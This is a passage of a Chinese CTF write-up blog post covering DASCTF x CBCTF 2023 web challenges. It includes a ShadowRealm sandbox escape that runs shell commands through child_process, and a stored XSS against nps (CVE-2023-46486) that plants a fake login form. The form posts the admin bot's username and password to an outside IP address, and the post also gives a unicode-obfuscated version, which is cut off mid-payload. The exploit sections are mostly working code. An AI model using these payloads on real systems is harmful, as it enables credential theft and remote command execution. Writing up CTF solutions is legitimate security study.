<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#3367D6">
  <link rel="apple-touch-icon" href="/icons-192.png">
  <link rel="manifest" href="/manifest.json">
  
  <meta name="generator" content="Hexo 6.0.0">

  

  

  
    <meta name="author" content="1llustrious">
  

  

  

  <title>DAS0RAYSXCBCTF | 光辉的blog啦~~</title>

  

  
    <link rel="shortcut icon" href="/favicon.ico">
  

  <!--mathjax latex数学公式显示支持-->
  
  

  
    
    
  

  

  


<script>function loadCss(l){var d=document,h=d.head,s=d.createElement('link');s.rel='stylesheet';s.href=l;!function e(f){if (d.body)return f();setTimeout(function(){e(f)})}(function(){h.appendChild(s);});}loadCss('/style.css');loadCss('https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css');loadCss('https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css');</script><noscript><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css"></noscript></head>
<body>
  <div class="root-container">
    
<!-- header container -->
<header class="header-container post">
  
    <div class="post-image" style="background-image: url(https://raw.githubusercontent.com/1llustrious/img/main/background6.jpg)"></div>
  

  <!-- navbar -->
<nav class="navbar">
  <div class="navbar-content">
    <!-- logo -->
    <div class="navbar-logo">
      <a href="/">
        
          光辉的blog啦~~
        
      </a>
    </div>
    <!-- link -->
    <div class="navbar-link">
      <div class="navbar-btn">
        <div></div>
        <div></div>
        <div></div>
      </div>
      <ul class="navbar-list">
        
          <li class="navbar-list-item"><a href="/">首页</a></li>
        
          <li class="navbar-list-item"><a href="/links">友链</a></li>
        
          <li class="navbar-list-item"><a href="/about">关于</a></li>
        
      </ul>
    </div>
  </div>
</nav>

  
  

  
  

  
  

  
  

  
  
    <div class="header-content">
      <div class="post-text layout-block">
        <div class="layout-margin">
          <h1 class="title-wrap">DAS0RAYSXCBCTF</h1>
          <h2 class="title-sub-wrap">
            <strong>1llustrious</strong>
            <span>发布于</span>
            <time class="article-date" datetime="2023-11-30T08:12:36.000Z" itemprop="datePublished">2023-11-30</time>
          </h2>
          
          
          <ul class="wrap-list dark">
  
</ul>
          <ul class="wrap-list dark">
  
    <li><a href="/tags/CTF/">🏷️ CTF</a></li>
  
</ul>
        </div>
      </div>
    </div>
  

  
  
  
</header>

    <!-- 文章 -->

<!-- 文章内容 -->
<div class="body-container">
  <article class="content-container layout-block post-container">
    <div class="article-info">
      
      
      
      
      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
        <!-- toc -->
<ul>
<li><a href="#das0raysxcbctf">DAS0RAYSxCBCTF</a></li>
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
<li><a href="#yet-another-box">yet another box</a>
<ul>
<li><a href="#stack-trace-api">Stack trace API</a></li>
<li><a href="#shadow-realm-api">Shadow-Realm-API</a></li>
<li><a href="#dynamic-import%E6%96%B9%E6%A1%88">dynamic import 方案</a></li>
<li><a href="#exp">exp</a></li>
</ul>
</li>
<li><a href="#nps">nps</a>
<ul>
<li><a href="#%E5%BC%80%E6%89%93">开打😓</a></li>
<li><a href="#remote%E5%B9%B2">remote 干🤪</a>
<ul>
<li><a href="#%E5%BF%86%E6%82%9F%E8%BF%99%E5%B0%B1%E6%98%AFxss%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%88%9B%E9%80%A0">忆！悟！这就是 xss 的机器人创造</a></li>
<li><a href="#exp-1">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#deserializeupload">Deserialize?Upload!</a>
<ul>
<li><a href="#actuator">actuator😫</a></li>
<li><a href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E8%B7%B5">题目实践😓😡</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90">反序列化分析😛</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3">文件上传 + 反序列化组合拳😤</a></li>
</ul>
</li>
<li><a href="#dasctfxcbctf_2023_bypassjava">DASCTFXCBCTF_2023_bypassJava</a>
<ul>
<li><a href="#content-length%E9%99%90%E5%88%B6">Content-Length 限制</a></li>
<li><a href="#chuncked%E7%BC%96%E7%A0%81%E6%80%8E%E4%B9%88%E5%8F%91">chuncked 编码怎么发</a></li>
<li><a href="#%E4%B8%8D%E7%A8%B3%E5%AE%9Ajackson%E9%93%BE%E9%97%AE%E9%A2%98">不稳定 jackson 链问题</a>
<ul>
<li><a href="#%E6%B5%81%E7%A8%8B">流程</a></li>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E5%AE%9A">为什么顺序不一定</a></li>
<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">解决方法😊</a>
<ul>
<li><a href="#%E5%AE%9E%E7%8E%B0">实现</a></li>
</ul>
</li>
<li><a href="#%E6%9E%84%E9%80%A0">构造</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E5%AD%98%E7%9A%84%E4%BD%BF%E7%94%A8">内存🐎的使用🥵👴</a>
<ul>
<li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">列目录</a></li>
<li><a href="#%E8%AF%BB%E6%96%87%E4%BB%B6">读文件</a></li>
</ul>
</li>
<li><a href="#rasp">RASP😅😡</a>
<ul>
<li><a href="#%E5%95%A5%E4%BA%8Brasp">啥事 RASP</a></li>
</ul>
</li>
<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">解决方案😒</a>
<ul>
<li><a href="#jni%E8%A7%84%E8%8C%83">JNI 规范</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="das0raysxcbctf"><a class="markdownIt-Anchor" href="#das0raysxcbctf">#</a> DAS0RAYSxCBCTF</h1>
<h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面">#</a> 写在前面</h1>
<p>wcsnmd, 谁给👴出的这么恶心的 web,nmd 爆零了，tmd 总共 3100 的解，什么√⑧玩意儿.</p>
<p>wp:<a target="_blank" rel="noopener" href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">‌‍﻿⁡﻿⁣‌‍﻿‍⁣⁢⁢﻿‌‍‬﻿⁣﻿‌⁣⁢‌⁡⁤⁢⁤⁤‌‌⁡⁢‌‍﻿⁣‌‌⁡⁣﻿﻿DASCTF x CBCTF - 飞书云文档 (feishu.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
<h1 id="yet-another-box"><a class="markdownIt-Anchor" href="#yet-another-box">#</a> yet another box</h1>
<p>这题是一个比较新的沙箱 <code>shadowrealm</code> , 这 byd 和 node 的 vm8 太一样，有着自己的全局对象和内置函数，就挺抽象，没法像 <code>vm</code> , 也无法通过 <code>prototype pollution</code>  控制主模块中的内置属性另外由于与 package.json 声明了 “type”:“module” 且文件结尾为 .mjs，所采用的 ESM 默认 strict mode，无法通过 [stack-trace-api](<a target="_blank" rel="noopener" href="https://v8.dev/docs/stack-trace-api#customizing-stack-traces">Stack trace API・V8 — 堆栈跟踪 API・V8 发动机</a>) 跨上下文取得可利用对象。</p>
<h2 id="stack-trace-api"><a class="markdownIt-Anchor" href="#stack-trace-api">#</a> Stack trace API</h2>
<p>仅作为学习记录使用，并不为本题提供思路.</p>
<p>默认情况下，V8 抛出的几乎所有错误都有一个属性，抛出错误的时候会用到方法，该方法能获得到外面的全局对象.</p>
<h2 id="shadow-realm-api"><a class="markdownIt-Anchor" href="#shadow-realm-api">#</a> Shadow-Realm-API</h2>
<p><code>Wrapped Function Exotic Objects</code>  是一种奇异对象，内含一个回调函数。具有一些内置槽 <code>slot</code> ,:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Internal slots</th>
<th style="text-align:center">Type</th>
<th style="text-align:center"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[[WrappedTargetFunction]]</td>
<td style="text-align:center">Callable Object</td>
<td style="text-align:center">Stores the callable object.</td>
</tr>
<tr>
<td style="text-align:center">[[Call]]</td>
<td style="text-align:center">The [[Call]] internal method</td>
<td style="text-align:center">Executes code associated with this object’s [[WrappedTargetFunction]].</td>
</tr>
<tr>
<td style="text-align:center">[[Realm]]</td>
<td style="text-align:center"><a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm-record"> Realm Record</a></td>
<td style="text-align:center">The <a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm">realm</a> in which the function was created.</td>
</tr>
</tbody>
</table>
<p>还有 [[Prototype]] and [[Extensible]]</p>
<p>对象的 [[call]] 方法获取两个参数:thisArgument, argumentsList . 调用时会实现以下步骤:</p>
<p>1. 设置运行代码的上下文。执行上下文通常包括执行函数的作用域、变量、this 值等信息。</p>
<p>2. 设置新的作用域 calleecontext.</p>
<p>3. 执行 assert 断言，确保 calleecontext 是目前正在执行的上下文.</p>
<p>4. 用 result 储存 **OrdinaryWrappedFunctionCall (F, thisArgument, argumentsList)** 的运行结果</p>
<p>5.calleeContext 被从执行上下文栈中移除，而 callerContext 被恢复为当前运行的执行上下文。</p>
<p>6. 判断返回类型，如果 [[TYPE]] 已返回，则返回 value.</p>
<p>7. 处理异常</p>
<p>8. 执行结束.</p>
<h2 id="dynamic-import-方案"><a class="markdownIt-Anchor" href="#dynamic-import方案">#</a> dynamic import 方案</h2>
<p>通过动态 import 允许我们按需加载 JavaScript 模块，而不会在最开始的时候就将全部模块加载。</p>
<p>动态 import 返回了一个 Promise 对象，这也意味着可以在 then 中等模块加载成功后去做一些操作。</p>
<p>所以 import 导入需要通过 then 去触发其方法.</p>
<p>import 在执行方法后仍然是 promise 对象，采用的类似于链式调用.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var test = <span class="keyword">import</span>(<span class="string">"child_process"</span>).then(m=&gt;console.log(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>其中 test 获取 promise 异步对象，而 m 直接就获得 child_process 对象.</p>
<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2>
<p>简而言之</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts</span><br></pre></td></tr></tbody></table></figure>
<p>支持 dynamic import</p>
<p>“Dynamic import” 是指在 JavaScript 中动态加载模块或文件的能力。这是 ECMAScript 2020 标准的一部分，引入了 import () 函数，它可以在运行时异步加载模块。这与传统的静态 import 语句不同，后者在代码加载时即确定了要导入的模块。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'child_process'</span>).then(m=&gt;m.execSync(<span class="string">'/readflag &gt; /app/asserts/flag'</span>));</span><br><span class="line"><span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure>
<h1 id="nps"><a class="markdownIt-Anchor" href="#nps">#</a> nps</h1>
<p>md 又是 xss,👴又 tnnd 不会，しね！</p>
<p>🧀一个 nps 网站上的 xss. 涉及<a target="_blank" rel="noopener" href="https://blog.carrot2.cn/2023/10/nps2.html"> CVE-2023-46486</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">项目地址</a></p>
<p>影响范围:</p>
<p>nps&lt;=V0.26.10</p>
<p>你 tm 搁这放屁呢，最新版本就是这个，21 年最后 publish 了.</p>
<p>漏洞怎么个事:</p>
<p><code>bootstrapTable</code>  并未配置 <code>escape</code>  字段，且使用时不改默认配置</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223246.png" alt="微信截图_20231101223246"></p>
<p>kokodayo,web/views/client/list.html</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223529.png" alt="微信截图_20231101223529"></p>
<p>这里设置公钥，防止被 ntr (被别人用代理), 你也不希望你拿不到 shell 吧 (bushi)</p>
<p>同为代理，经常被提起的 frp 和 venom 都没太注意公钥，实际上是有公钥这一选项的.</p>
<p>这里，我们完全就能够通过客户端去进行攻击了.</p>
<h2 id="开打"><a class="markdownIt-Anchor" href="#开打">#</a> 开打😓</h2>
<p>cnm,sbwindows, 死活用不成，linux 一下就出来了和👴😡了</p>
<p>√⑧玩意，当👴⭐😡吧</p>
<p>首先下载客户端，这一点和 frp 的 admin 端和 agent 端类似</p>
<p>然后配置客户端的配置文件</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101224733.png" alt="微信截图_20231101224733"></p>
<p>× 成功了，狠狠地 × 进去</p>
<h2 id="remote-干"><a class="markdownIt-Anchor" href="#remote干">#</a> remote 干🤪</h2>
<h3 id="忆悟这就是-xss-的机器人创造"><a class="markdownIt-Anchor" href="#忆悟这就是xss的机器人创造">#</a> 忆！悟！这就是 xss 的机器人创造</h3>
<p>首先题目通过 js 代码造了个后台机器人，👴很喜欢</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> {chromium, errors} <span class="keyword">from</span> <span class="string">"playwright-chromium"</span>;</span><br><span class="line"></span><br><span class="line">const PASSWORD = <span class="string">"DASCTF_flag"</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="keyword">async</span> function visit() {</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++){</span><br><span class="line">                <span class="keyword">try</span>{</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">'http://a.o.com:8080/client/list'</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }catch (e) {</span><br><span class="line">                    console.log(e);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) {</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        } catch (e) {</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError){</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                console.log(e);</span><br><span class="line">            }     </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    const browser = <span class="keyword">await</span> chromium.launch({</span><br><span class="line">        headless: true</span><br><span class="line">    });</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br><span class="line">})();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>看不懂没关系，👴来带你分析一下.</p>
<p>首先整个就是一坨 shit⛰,</p>
<p>通过一个箭头函数 () 的方式立即调用</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const browser = <span class="keyword">await</span> chromium.launch({</span><br><span class="line">        headless: true</span><br><span class="line">    });</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>首先创建一个浏览器和上下文，然后设置 setIneterval, 表示每三十秒调用 visit, 函数，让👴看看 visit 函数怎么个事</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="keyword">async</span> function visit() {</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++){</span><br><span class="line">                <span class="keyword">try</span>{</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">'http://a.o.com:8080/client/list'</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }catch (e) {</span><br><span class="line">                    console.log(e);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) {</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        } catch (e) {</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError){</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                console.log(e);</span><br><span class="line">            }     </span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>首先获取新页面，然后访问三次 <code>http://a.o.com:8080/client/list</code></p>
<p>你看看眼熟不，/client/list 刚好就是刚才展示 xss 的路径，你品，你细品。这个 host 眼熟不，这可是在 docker 里面设置的地址映射啊.</p>
<p>ならば　答えはひとつだ</p>
<p>就是 xss, 接下来就是分析这个机器人事怎么操作的了.</p>
<p>首先要看有无 <code>button[langtag="word-login"]</code>  这玩意</p>
<p>那我们就需要设置一个 button 了，不过我们可以在这里面下点毒</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"fetch('http://43.143.192.19:1145/',{method:'POST',body:$('#username')[0].value+'___'+$('#password')[0].value});"</span> langtang=&gt;&lt;/button&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>$(‘#username’) 是一个 jQuery 选择器，用于选择具有指定 id 属性的 HTML 元素。在这个选择器中，#username 表示要选择 id 为 “username” 的元素。会从输入获取</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"text"</span> <span class="built_in">id</span>=<span class="string">"username"</span> name=<span class="string">"username"</span> value=<span class="string">"flag"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>再根据这个</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br></pre></td></tr></tbody></table></figure>
<p>让机器人去输入我们设置好的登录框，从而通过 input 获取到 flag.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">"username"</span> <span class="built_in">id</span>=<span class="string">"username"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Username"</span> required=<span class="string">""</span> langtag=<span class="string">"word-username"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">"password"</span> <span class="built_in">id</span>=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Password"</span> required=<span class="string">""</span> langtag=<span class="string">"word-password"</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>如此，圈套已设，只等敌军进入</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form <span class="keyword">class</span>=<span class="string">"m-t"</span> onsubmit=<span class="string">"return false"</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">"username"</span> <span class="built_in">id</span>=<span class="string">"username"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Username"</span> required=<span class="string">""</span> langtag=<span class="string">"word-username"</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">"password"</span> <span class="built_in">id</span>=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Password"</span> required=<span class="string">""</span> langtag=<span class="string">"word-password"</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button onclick=<span class="string">"fetch('http://43.143.192.19:1145/',{method:'POST',body:$('#username')[0].value+'___'+$('#password')[0].value});"</span> langtag=<span class="string">"word-login"</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>这么复杂数据传输起来不方便，👴不喜欢，换一个</p>
<h3 id="exp"><a class="markdownIt-Anchor" href="#exp-2">#</a> exp</h3>
<p>unicode 就行，而且控制台大大支持 unicode</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=node4.buuoj.cn:<span class="number">26658</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\u003c\u0068\u0074\u006d\u006c\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0068\u0065\u0061\u0064\u003e\u003c\u002f\u0068\u0065\u0061\u0064\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0062\u006f\u0064\u0079\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0066\u006f\u0072\u006d\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u006d\u002d\u0074\u0022\u0020\u006f\u006e\u0073\u0075\u0062\u006d\u0069\u0074\u003d\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0066\u0061\u006c\u0073\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0069\u0064\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0069\u0064\u003d\u0022\u0070\u0061\u0073\u